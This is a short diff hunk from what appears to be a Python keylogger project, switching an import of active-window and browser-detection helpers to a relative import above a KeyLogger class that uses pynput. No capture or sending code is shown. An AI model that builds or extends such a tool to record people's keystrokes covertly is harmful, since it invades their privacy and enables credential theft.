@@ -9,7 +9,7 @@ from pathlib import Path
 
 from pynput.keyboard import Key, KeyCode
 
-from keylogger.detectors import get_active_window_name, is_browser_active
+from .detectors import get_active_window_name, is_browser_active
 
 
 class KeyLogger:
